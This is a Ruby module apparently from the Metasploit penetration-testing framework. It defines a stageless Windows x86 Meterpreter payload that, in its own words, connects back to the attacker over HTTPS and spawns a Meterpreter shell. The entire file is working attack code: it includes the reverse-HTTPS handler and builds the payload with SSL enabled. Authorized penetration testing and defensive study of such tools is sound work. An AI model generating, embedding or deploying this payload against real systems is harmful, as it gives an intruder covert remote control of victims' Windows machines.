##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/handler/reverse_http/stageless'
require 'msf/core/payload/windows/stageless_meterpreter'
require 'msf/base/sessions/meterpreter_x86_win'
require 'msf/base/sessions/meterpreter_options'

module Metasploit4

  CachedSize = :dynamic

  include Msf::Payload::Windows::StagelessMeterpreter
  include Msf::Handler::ReverseHttp::Stageless
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Windows Meterpreter Shell, Reverse HTTPS Inline',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'Author'      => [ 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Session'     => Msf::Sessions::Meterpreter_x86_Win
      ))

    initialize_stageless
  end

  def generate
    # generate a stageless payload using the x86 version of
    # the stageless generator
    opts = {
      :ssl       => true,
      :generator => method(:generate_stageless_x86)
    }
    generate_stageless(opts)
  end

end
